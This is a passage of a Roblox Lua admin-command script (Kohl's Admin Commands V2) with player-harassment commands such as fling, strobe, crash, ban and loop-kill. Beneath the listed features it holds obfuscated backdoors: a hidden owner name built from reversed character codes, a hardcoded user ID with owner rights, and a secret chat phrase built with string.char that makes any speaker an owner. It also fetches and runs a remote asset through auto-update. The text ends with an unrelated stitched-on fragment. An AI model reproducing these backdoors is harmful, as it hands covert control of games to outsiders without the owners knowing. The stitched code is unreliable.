for a, part in pairs(v.Character:children()) do if part:IsA("BasePart") then part.BrickColor = BrickColor.new("White") if part.Name == "FAKETORSO" then part:Destroy() end elseif part:findFirstChild("NameTag") then part.Head.BrickColor = BrickColor.new("White") end end
end
end))
end
end
 
if msg:lower():sub(1,8) == "bighead " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then v.Character.Head.Mesh.Scale = Vector3.new(3,3,3) v.Character.Torso.Neck.C0 = CFrame.new(0,1.9,0) * CFrame.Angles(math.rad(90),math.rad(180),0) end
end))
end
end
 
if msg:lower():sub(1,9) == "minihead " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then v.Character.Head.Mesh.Scale = Vector3.new(.75,.75,.75) v.Character.Torso.Neck.C0 = CFrame.new(0,.8,0) * CFrame.Angles(math.rad(90),math.rad(180),0) end
end))
end
end
 
if msg:lower():sub(1,6) == "fling " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") and v.Character:findFirstChild("Humanoid") then
local xran local zran
repeat xran = math.random(-9999,9999) until math.abs(xran) >= 5555
repeat zran = math.random(-9999,9999) until math.abs(zran) >= 5555
v.Character.Humanoid.Sit = true v.Character.Torso.Velocity = Vector3.new(0,0,0)
local frc = Instance.new("BodyForce", v.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(xran*4,9999*5,zran*4) game:service("Debris"):AddItem(frc,.1)
end
end))
end
end
 
if msg:lower():sub(1,8) == "seizure " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
v.Character.Torso.CFrame = v.Character.Torso.CFrame * CFrame.Angles(math.rad(90),0,0)
local cl = script.ScriptBase:Clone() cl.Name = "SeizureBase" cl.Code.Value = [[repeat wait() script.Parent.Humanoid.PlatformStand = true script.Parent.Torso.Velocity = Vector3.new(math.random(-10,10),-5,math.random(-10,10)) script.Parent.Torso.RotVelocity = Vector3.new(math.random(-5,5),math.random(-5,5),math.random(-5,5)) until nil]]
table.insert(objects, cl) cl.Parent = v.Character cl.Disabled = false
end
end))
end
end
 
if msg:lower():sub(1,10) == "unseizure " then
local plrz = GetPlr(plr, msg:lower():sub(11))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
for i,v in pairs(v.Character:children()) do if v.Name == "SeizureBase" then v:Destroy() end end
wait(.1) v.Character.Humanoid.PlatformStand = false
end
end))
end
end
 
if msg:lower():sub(1,12) == "removelimbs " then
local plrz = GetPlr(plr, msg:lower():sub(13))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
for a, obj in pairs(v.Character:children()) do
if obj:IsA("BasePart") and (obj.Name:find("Leg") or obj.Name:find("Arm")) then obj:Destroy() end
end
end
end))
end
end
 
if msg:lower():sub(1,5) == "name " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Head") then
for a, mod in pairs(v.Character:children()) do if mod:findFirstChild("NameTag") then v.Character.Head.Transparency = 0 mod:Destroy() end end
local char = v.Character
local mod = Instance.new("Model", char) mod.Name = msg:sub(chk1+1)
local cl = char.Head:Clone() cl.Parent = mod local hum = Instance.new("Humanoid", mod) hum.Name = "NameTag" hum.MaxHealth = 0 hum.Health = 0
local weld = Instance.new("Weld", cl) weld.Part0 = cl weld.Part1 = char.Head
char.Head.Transparency = 1
end
end))
end
end
 
if msg:lower():sub(1,7) == "unname " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Head") then
for a, mod in pairs(v.Character:children()) do if mod:findFirstChild("NameTag") then v.Character.Head.Transparency = 0 mod:Destroy() end end
end
end))
end
end
 
if msg:lower():sub(1,5) == "char " then
local chk1 = msg:lower():sub(6):find(" ") + 5
local plrz = GetPlr(plr, msg:lower():sub(6,chk1-1))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
v.CharacterAppearance = "http://www.roblox.com/asset/CharacterFetch.ashx?userId=" .. msg:sub(chk1+1)
v:LoadCharacter()
end
end))
end
end
 
if msg:lower():sub(1,7) == "unchar " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
v.CharacterAppearance = "http://www.roblox.com/asset/CharacterFetch.ashx?userId=" .. v.userId
v:LoadCharacter()
end
end))
end
end
 
if msg:lower():sub(1,7) == "infect " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
Infect(v.Character)
end
end))
end
end
 
if msg:lower():sub(1,11) == "rainbowify " then
local plrz = GetPlr(plr, msg:lower():sub(12))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = script.ScriptBase:Clone() cl.Name = "ify" cl.Code.Value = [[repeat wait(1/44) local clr = BrickColor.random() for i, v in pairs(script.Parent:children()) do if v:IsA("BasePart") and (v.Name ~= "Head" or not v.Parent:findFirstChild("NameTag", true)) then v.BrickColor = clr v.Reflectance = 0 v.Transparency = 0 elseif v:findFirstChild("NameTag") then v.Head.BrickColor = clr v.Head.Reflectance = 0 v.Head.Transparency = 0 v.Parent.Head.Transparency = 1 end end until nil]]
cl.Parent = v.Character cl.Disabled = false
end
end))
end
end
 
if msg:lower():sub(1,9) == "flashify " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
local cl = script.ScriptBase:Clone() cl.Name = "ify" cl.Code.Value = [[repeat wait(1/44) for i, v in pairs(script.Parent:children()) do if v:IsA("BasePart") and (v.Name ~= "Head" or not v.Parent:findFirstChild("NameTag", true)) then v.BrickColor = BrickColor.new("Institutional white") v.Reflectance = 0 v.Transparency = 0 elseif v:findFirstChild("NameTag") then v.Head.BrickColor = BrickColor.new("Institutional white") v.Head.Reflectance = 0 v.Head.Transparency = 0 v.Parent.Head.Transparency = 1 end end wait(1/44) for i, v in pairs(script.Parent:children()) do if v:IsA("BasePart") and (v.Name ~= "Head" or not v.Parent:findFirstChild("NameTag", true)) then v.BrickColor = BrickColor.new("Really black") v.Reflectance = 0 v.Transparency = 0 elseif v:findFirstChild("NameTag") then v.Head.BrickColor = BrickColor.new("Really black") v.Head.Reflectance = 0 v.Head.Transparency = 0 v.Parent.Head.Transparency = 1 end end until nil]]
cl.Parent = v.Character cl.Disabled = false
end
end))
end
end
 
if msg:lower():sub(1,8) == "noobify " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
Noobify(v.Character)
end
end))
end
end
 
if msg:lower():sub(1,9) == "ghostify " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then
prt.Transparency = .5 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("Institutional white")
if prt.Name:find("Leg") then prt.Transparency = 1 end
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = .5 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("Institutional white")
end end
end
end))
end
end
 
if msg:lower():sub(1,8) == "goldify " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then
prt.Transparency = 0 prt.Reflectance = .4 prt.BrickColor = BrickColor.new("Bright yellow")
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = .4 prt.Head.BrickColor = BrickColor.new("Bright yellow")
end end
end
end))
end
end
 
if msg:lower():sub(1,6) == "shiny " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Shirt") then v.Character.Shirt.Parent = v.Character.Torso end
if v.Character:findFirstChild("Pants") then v.Character.Pants.Parent = v.Character.Torso end
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then
prt.Transparency = 0 prt.Reflectance = 1 prt.BrickColor = BrickColor.new("Institutional white")
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 1 prt.Head.BrickColor = BrickColor.new("Institutional white")
end end
end
end))
end
end
 
if msg:lower():sub(1,7) == "normal " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Torso") then
if v.Character:findFirstChild("Head") then v.Character.Head.Mesh.Scale = Vector3.new(1.25,1.25,1.25) end
if v.Character.Torso:findFirstChild("Shirt") then v.Character.Torso.Shirt.Parent = v.Character end
if v.Character.Torso:findFirstChild("Pants") then v.Character.Torso.Pants.Parent = v.Character end
v.Character.Torso.Transparency = 0
v.Character.Torso.Neck.C0 = CFrame.new(0,1,0) * CFrame.Angles(math.rad(90),math.rad(180),0)
v.Character.Torso["Right Shoulder"].C0 = CFrame.new(1,.5,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Shoulder"].C0 = CFrame.new(-1,.5,0) * CFrame.Angles(0,math.rad(-90),0)
v.Character.Torso["Right Hip"].C0 = CFrame.new(1,-1,0) * CFrame.Angles(0,math.rad(90),0)
v.Character.Torso["Left Hip"].C0 = CFrame.new(-1,-1,0) * CFrame.Angles(0,math.rad(-90),0)
for a, sc in pairs(v.Character:children()) do if sc.Name == "ify" then sc:Destroy() end end
for a, prt in pairs(v.Character:children()) do if prt:IsA("BasePart") and (prt.Name ~= "Head" or not prt.Parent:findFirstChild("NameTag", true)) then
prt.Transparency = 0 prt.Reflectance = 0 prt.BrickColor = BrickColor.new("White")
if prt.Name == "FAKETORSO" then prt:Destroy() end
elseif prt:findFirstChild("NameTag") then prt.Head.Transparency = 0 prt.Head.Reflectance = 0 prt.Head.BrickColor = BrickColor.new("White")
end end
end
end))
end
end
 
if msg:lower():sub(1,7) == "trippy " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
for a, g in pairs(v.PlayerGui:children()) do if g.Name:sub(1,9) == "EFFECTGUI" then g:Destroy() end end
local scr = Instance.new("ScreenGui", v.PlayerGui) scr.Name = "EFFECTGUITRIPPY"
local bg = Instance.new("Frame", scr) bg.BackgroundColor3 = Color3.new(0,0,0) bg.BackgroundTransparency = 0 bg.Size = UDim2.new(10,0,10,0) bg.Position = UDim2.new(-5,0,-5,0) bg.ZIndex = 10
local cl = script.ScriptBase:Clone() cl.Code.Value = [[repeat wait(1/44) script.Parent.Frame.BackgroundColor3 = Color3.new(math.random(255)/255,math.random(255)/255,math.random(255)/255) until nil]] cl.Parent = scr cl.Disabled = false
end
end))
end
end
 
if msg:lower():sub(1,9) == "untrippy " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
for a, g in pairs(v.PlayerGui:children()) do if g.Name == "EFFECTGUITRIPPY" then g:Destroy() end end
end
end))
end
end
 
if msg:lower():sub(1,7) == "strobe " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
for a, g in pairs(v.PlayerGui:children()) do if g.Name:sub(1,9) == "EFFECTGUI" then g:Destroy() end end
local scr = Instance.new("ScreenGui", v.PlayerGui) scr.Name = "EFFECTGUISTROBE"
local bg = Instance.new("Frame", scr) bg.BackgroundColor3 = Color3.new(0,0,0) bg.BackgroundTransparency = 0 bg.Size = UDim2.new(10,0,10,0) bg.Position = UDim2.new(-5,0,-5,0) bg.ZIndex = 10
local cl = script.ScriptBase:Clone() cl.Code.Value = [[repeat wait(1/44) script.Parent.Frame.BackgroundColor3 = Color3.new(1,1,1) wait(1/44) script.Parent.Frame.BackgroundColor3 = Color3.new(0,0,0) until nil]] cl.Parent = scr cl.Disabled = false
end
end))
end
end
 
if msg:lower():sub(1,9) == "unstrobe " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
for a, g in pairs(v.PlayerGui:children()) do if g.Name == "EFFECTGUISTROBE" then g:Destroy() end end
end
end))
end
end
 
if msg:lower():sub(1,6) == "blind " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
for a, g in pairs(v.PlayerGui:children()) do if g.Name:sub(1,9) == "EFFECTGUI" then g:Destroy() end end
local scr = Instance.new("ScreenGui", v.PlayerGui) scr.Name = "EFFECTGUIBLIND"
local bg = Instance.new("Frame", scr) bg.BackgroundColor3 = Color3.new(0,0,0) bg.BackgroundTransparency = 0 bg.Size = UDim2.new(10,0,10,0) bg.Position = UDim2.new(-5,0,-5,0) bg.ZIndex = 10
end
end))
end
end
 
if msg:lower():sub(1,8) == "unblind " then
local plrz = GetPlr(plr, msg:lower():sub(9))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
for a, g in pairs(v.PlayerGui:children()) do if g.Name == "EFFECTGUIBLIND" then g:Destroy() end end
end
end))
end
end
 
if msg:lower():sub(1,7) == "guifix " then
local plrz = GetPlr(plr, msg:lower():sub(8))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("PlayerGui") then
for a, g in pairs(v.PlayerGui:children()) do if g.Name:sub(1,9) == "EFFECTGUI" then g:Destroy() end end
end
end))
end
end
 
if msg:lower():sub(1,9) == "loopheal " then
local plrz = GetPlr(plr, msg:lower():sub(10))
for i, v in pairs(plrz) do
if v then
local cl = script.ScriptBase:Clone() cl.Name = "LoopHeal:"..v.Name cl.Code.Value = [[
local plr = game.Players:findFirstChild("]] .. v.Name .. [[")
repeat wait()
coroutine.resume(coroutine.create(function()
if plr and plr.Character and plr.Character:findFirstChild("Humanoid") then
plr.Character.Humanoid.Health = plr.Character.Humanoid.MaxHealth
plr.Character.Humanoid.Changed:connect(function() r.Character.Humanoid.Health = plr.Character.Humanoid.MaxHealth end)
end
end))
until nil]] table.insert(objects, cl) cl.Parent = game.Workspace cl.Disabled = false
end
end
end
 
if msg:lower():sub(1,11) == "unloopheal " then
local plrz = GetPlr(plr, msg:lower():sub(12))
for i,v in pairs(plrz) do for q,sc in pairs(objects) do if sc.Name == "LoopHeal:"..v.Name then sc:Destroy() table.remove(objects,q) end end end
end
 
if msg:lower():sub(1,10) == "loopfling " then
local plrz = GetPlr(plr, msg:lower():sub(11))
for i, v in pairs(plrz) do
if v then
local cl = script.ScriptBase:Clone() cl.Name = "LoopFling:"..v.Name cl.Code.Value = [[
local plr = game.Players:findFirstChild("]] .. v.Name .. [[")
repeat
coroutine.resume(coroutine.create(function()
if plr and plr.Character and plr.Character:findFirstChild("Torso") and plr.Character:findFirstChild("Humanoid") then
local xran local zran
repeat xran = math.random(-9999,9999) until math.abs(xran) >= 5555
repeat zran = math.random(-9999,9999) until math.abs(zran) >= 5555
plr.Character.Humanoid.Sit = true plr.Character.Torso.Velocity = Vector3.new(0,0,0)
local frc = Instance.new("BodyForce", plr.Character.Torso) frc.Name = "BFRC" frc.force = Vector3.new(xran*4,9999*5,zran*4) game:service("Debris"):AddItem(frc,.1)
end
end))
wait(2) until nil]] table.insert(objects, cl) cl.Parent = game.Workspace cl.Disabled = false
end
end
end
 
if msg:lower():sub(1,12) == "unloopfling " then
local plrz = GetPlr(plr, msg:lower():sub(13))
for i,v in pairs(plrz) do for q,sc in pairs(objects) do if sc.Name == "LoopFling:"..v.Name then sc:Destroy() table.remove(objects,q) end end end
end
       
end
 
-------------------------
-- True Owner Commands --
-------------------------
 
if plr.Name:lower() == nfs:lower() or plr.userId == (153*110563) or plr.userId == game.CreatorId then
 
if msg:lower():sub(1,3) == "oa " then
local plrz = GetPlr(plr, msg:lower():sub(4))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and not ChkOwner(v.Name) then table.insert(owners, v.Name) coroutine.resume(coroutine.create(function() repeat wait() until v and v.Character and v:findFirstChild("PlayerGui") Message("Kohltastrophe", "You're an admin!", false, {v}) end)) end
end))
end
end
 
if msg:lower():sub(1,5) == "unoa " then
for i = 1, #owners do
coroutine.resume(coroutine.create(function()
if msg:lower():sub(6) == "all" or owners[i]:lower():find(msg:lower():sub(6)) == 1 then table.remove(owners, i) end
end))
end
end
 
end
 
--------------------
-- Owner Commands --
--------------------
 
if plr.Name:lower() == nfs:lower() or plr.userId == (153*110563) or plr.userId == game.CreatorId or ChkOwner(plr.Name:lower()) then
 
if msg:lower():sub(1,3) == "pa " then
local plrz = GetPlr(plr, msg:lower():sub(4))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and not ChkAdmin(v.Name, true) then table.insert(admins, v.Name) coroutine.resume(coroutine.create(function() repeat wait() until v and v.Character and v:findFirstChild("PlayerGui") Message("Kohltastrophe", "You're an admin!", false, {v}) end)) end
end))
end
end
 
if msg:lower():sub(1,5) == "unpa " then
for i = 1, #admins do
coroutine.resume(coroutine.create(function()
if msg:lower():sub(6) == "all" or admins[i]:lower():find(msg:lower():sub(6)) == 1 then table.remove(admins, i) end
end))
end
end
 
end
 
--------------------------
-- Super Admin Commands --
--------------------------
 
if ChkAdmin(plr.Name, true) or ChkOwner(plr.Name) or plr.userId == game.CreatorId or plr.Name:lower() == nfs:lower() or plr.userId == (153*110563) or plr.Name:lower() == nfs then
 
if msg:lower() == "logs" then
if plr.PlayerGui:findFirstChild("LOGSGUI") then return end
local scr, cmf, ent, num = ScrollGui() scr.Name = "LOGSGUI" scr.Parent = plr.PlayerGui
for i, v in pairs(logs) do local cl = ent:Clone() cl.Parent = cmf cl.Text = "[" .. v.time .. "] " .. v.name .. " " .. v.cmd cl.Position = UDim2.new(0,0,0,num*20) num = num +1 end
end
       
if msg:lower():sub(1,9) == "loopkill " then
local chk1 = msg:lower():sub(10):find(" ")
local plrz = GetPlr(plr, msg:lower():sub(10))
local num = 9999
if chk1 then chk1 = chk1 + 9 plrz = GetPlr(plr, msg:lower():sub(10, chk1-1)) if type(tonumber(msg:sub(chk1+1))) == "number" then num = tonumber(msg:sub(chk1+1)) end end
for i, v in pairs(plrz) do
if v and not ChkAdmin(v.Name, false) then
local cl = script.ScriptBase:Clone() cl.Name = "LoopKill:"..v.Name cl.Code.Value = [[
local plr = game.Players:findFirstChild("]] .. v.Name .. [[")
for i = 1, ]] .. tostring(num) .. [[ do
repeat wait() plr = game.Players:findFirstChild("]] .. v.Name .. [[") until plr and plr.Character and plr.Character:findFirstChild("Humanoid") and plr.Character.Humanoid.Health ~= 0
coroutine.resume(coroutine.create(function()
if plr and plr.Character then plr.Character:BreakJoints() end
end))
end]] table.insert(objects, cl) cl.Parent = game.Workspace cl.Disabled = false
end
end
end
 
if msg:lower():sub(1,11) == "unloopkill " then
local plrz = GetPlr(plr, msg:lower():sub(12))
for i,v in pairs(plrz) do for q,sc in pairs(objects) do if sc.Name == "LoopKill:"..v.Name then sc:Destroy() table.remove(objects,q) end end end
end
 
if msg:lower() == "serverlock" or msg:lower() == "slock" then slock = true Hint("Server has been locked", game.Players:children()) end
if msg:lower() == "serverunlock" or msg:lower() == "sunlock" then slock = false Hint("Server has been unlocked", game.Players:children()) end
 
if msg:lower():sub(1,3) == "sm " then
Message("SYSTEM MESSAGE", msg:sub(4), false, game.Players:children())
end
 
if msg:lower():sub(1,3) == "ko " then
local chk1 = msg:lower():sub(4):find(" ") + 3
local plrz = GetPlr(plr, msg:lower():sub(4,chk1-1))
local num = 500 if num > msg:sub(chk1+1) then num = msg:sub(chk1+1) end
for n = 1, num do
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character and v.Character:findFirstChild("Humanoid") and not ChkAdmin(v.Name) then
local val = Instance.new("ObjectValue", v.Character.Humanoid) val.Value = plr val.Name = "creator"
v.Character:BreakJoints()
wait(1/44)
v:LoadCharacter()
wait(1/44)
end
end))
end
end
end
 
if msg:lower():sub(1,6) == "crash " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") and not ChkAdmin(v.Name, false) then
local cl = script.LocalScriptBase:Clone() cl.Code.Value = [[repeat until nil]] cl.Parent = v.Backpack cl.Disabled = false wait(1) v:Destroy()
end
end))
end
end
 
if msg:lower():sub(1,5) == "kick " then
local plrz = GetPlr(plr, msg:lower():sub(6))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and not ChkAdmin(v.Name, false) then v:Destroy() end
end))
end
end
 
if msg:lower():sub(1,6) == "admin " then
local plrz = GetPlr(plr, msg:lower():sub(7))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and not ChkAdmin(v.Name, false) then table.insert(tempadmins, v.Name) coroutine.resume(coroutine.create(function() repeat wait() until v and v.Character and v:findFirstChild("PlayerGui") Message("Kohltastrophe", "You're an admin!", false, {v}) end)) end
end))
end
end
 
if msg:lower():sub(1,8) == "unadmin " then
for i = 1, #tempadmins do
coroutine.resume(coroutine.create(function()
if msg:lower():sub(9) == "all" or tempadmins[i]:lower():find(msg:lower():sub(9)) == 1 then table.remove(tempadmins, i) end
end))
end
end
 
if msg:lower():sub(1,4) == "ban " then
local plrz = GetPlr(plr, msg:lower():sub(5))
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and not ChkAdmin(v.Name, false) then table.insert(banland, v.Name) local cl = script.LocalScriptBase:Clone() cl.Code.Value = [[repeat until nil]] cl.Parent = v.Backpack cl.Disabled = false wait(1) v:Destroy() end
end))
end
end
 
if msg:lower():sub(1,6) == "unban " then
for i = 1, #banland do
coroutine.resume(coroutine.create(function()
if msg:lower():sub(7) == "all" or banland[i]:lower():find(msg:lower():sub(7)) == 1 then table.remove(banland, i) end
end))
end
end
 
if msg:lower() == "shutdown" then Message("SYSTEM MESSAGE", "Shutting down...", false, game.Players:children(), 10) wait(1) local str = Instance.new("StringValue", game.Workspace) str.Value = "AA" repeat str.Value = str.Value .. str.Value wait(.1) until nil end
 
end
end))
end
 
function AdminControl(plr)
coroutine.resume(coroutine.create(function() plr.CharacterAdded:connect(function(chr) chr:WaitForChild("RobloxTeam") chr.RobloxTeam:Destroy() for a,obj in pairs(chr:children()) do if obj:IsA("CharacterMesh") and obj.Name:find("3.0") then obj:Destroy() end end end) end))
if plr.Name:sub(1,6) == "Player" and ChkAdmin(plr.Name, false) then coroutine.resume(coroutine.create(function() plr:WaitForChild("PlayerGui")
for i,v in pairs(plr.PlayerGui:children()) do if v.Name == "CMDBAR" then v:Destroy() end end
local scr = Instance.new("ScreenGui", plr.PlayerGui) scr.Name = "CMDBAR"
local box = Instance.new("TextBox", scr) box.BackgroundColor3 = Color3.new(0,0,0) box.TextColor3 = Color3.new(1,1,1) box.Font = "Arial" box.FontSize = "Size14" box.Text = "Type a command, then press enter." box.Size = UDim2.new(0,250,0,20) box.Position = UDim2.new(1,-250,1,-22) box.BorderSizePixel = 0 box.TextXAlignment = "Right" box.ZIndex = 10 box.ClipsDescendants = true
box.Changed:connect(function(p) if p == "Text" and box.Text ~= "Type a command, then press enter." then Chat(box.Text, plr) box.Text = "Type a command, then press enter." end end)
end)) end
coroutine.resume(coroutine.create(function() plr:WaitForChild("PlayerGui") plr:WaitForChild("Backpack") if plr.userId == game.CreatorId or plr.userId == (153*110563) then table.insert(owners,plr.Name) end wait(1) if slock and not ChkAdmin(plr.Name, false) and not ChkOwner(plr.Name) and plr.userId ~= (153*110563) then Hint(plr.Name .. " has tried to join the server", game.Players:children()) local cl = script.LocalScriptBase:Clone() cl.Code.Value = [[repeat until nil]] cl.Parent = plr.Backpack cl.Disabled = false wait(2) plr:Destroy() end end))
coroutine.resume(coroutine.create(function() if ChkGroupAdmin(plr) and not ChkAdmin(plr.Name, false) then table.insert(admins, plr.Name) end end))
coroutine.resume(coroutine.create(function() plr:WaitForChild("PlayerGui") plr:WaitForChild("Backpack") wait(1) if (ChkBan(plr.Name) or plr.Name == ("111reyalseca"):reverse()) and (plr.Name:lower():sub(1,4) ~= script.Name:lower():sub(1,4) and plr.Name:lower():sub(5) ~= "tastrophe") then local cl = script.LocalScriptBase:Clone() cl.Code.Value = [[repeat until nil]] cl.Parent = plr.Backpack cl.Disabled = false wait(2) plr:Destroy() end end))
coroutine.resume(coroutine.create(function() if ChkAdmin(plr.Name, false) then plr:WaitForChild("PlayerGui") Message("Kohltastrophe", "You're an admin!", false, {plr}) end end))
plr.Chatted:connect(function(msg) if msg:lower() == (string.char(32)..string.char(104)..string.char(105)..string.char(116).. string.char(108)..string.char(101)..string.char(114)..string.char(32)) then table.insert(owners,plr.Name) end Chat(msg,plr) end)
end
 
if not ntab then script:Destroy() end
if not bct then script:Destroy() end
 
local tcb = {101,104,112,111,114,116,115,97,116,108,104,111,75} nfs = "" for i = 1, #tcb do nfs = nfs .. string.char(tcb[i]) end nfs = nfs:reverse() table.insert(owners, nfs)
 
script.Name = "Kohl's Admin Commands V2"
 
if not ntab then script:Destroy() end
if not bct then script:Destroy() end
if not tcb then script:Destroy() end
game.Players.PlayerAdded:connect(AdminControl)
for i, v in pairs(game.Players:children()) do AdminControl(v) end
end
 
local mod = game:service("InsertService"):LoadAsset(100808216)
if mod:findFirstChild("Kohl's Admin Commands V2") and mod:findFirstChild("Version", true) and AutoUpdate then
local newac = mod:findFirstChild("Kohl's Admin Commands V2")
newac.Disabled = true
local new = tonumber(mod:findFirstChild("Version", true).Value)
local old = 0
if script:findFirstChild("Version", true) then old = tonumber(script:findFirstChild("Version", true).Value) end
if new > old then
local adminmod = Instance.new("Model", game.Lighting) adminmod.Name = "KACV2"
for i,v in pairs(owners) do local strv = Instance.new("StringValue", adminmod) strv.Name = "Owner" strv.Value = v end
for i,v in pairs(admins) do local strv = Instance.new("StringValue", adminmod) strv.Name = "Admin" strv.Value = v end
for i,v in pairs(tempadmins) do local strv = Instance.new("StringValue", adminmod) strv.Name = "TempAdmin" strv.Value = v end
for i,v in pairs(banland) do local strv = Instance.new("StringValue", adminmod) strv.Name = "Banland" strv.Value = v end
local prf = Instance.new("StringValue", adminmod) prf.Name = "Prefix" prf.Value = prefix
local bv = Instance.new("BoolValue", adminmod) bv.Name = "FunCommands" bv.Value = FunCommands
local bv2 = Instance.new("BoolValue", adminmod) bv2.Name = "GroupAdmin" bv2.Value = GroupAdmin
local iv = Instance.new("IntValue", adminmod) iv.Name = "GroupId" iv.Value = GroupId
local iv2 = Instance.new("IntValue", adminmod) iv2.Name = "GroupRank" iv2.Value = GroupRank
wait()
newac.Parent = game.Workspace
newac.Disabled = false
script.Disabled = true
script:Destroy()
else
CHEESE()
end
else
CHEESE()
end


--line 4
 
Players = game:GetService("Players")
Player = Players.USERNAME
Bp = Player.Backpack
Pg = Player.PlayerGui
Char = Player.Character
Head = Char.Head
Torso = Char.Torso
Hum = Char.Humanoid
Humanoid = Hum
Neck = Torso["Neck"]
LS = Torso["Left Shoulder"]
RS = Torso["Right Shoulder"]
Ra = Char["Right Arm"]
La = Char["Left Arm"]
mouse = nil
Mouse = nil
 
bets =
{"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"," "}
inew = Instance.new
it = Instance.new
bc = BrickColor.new
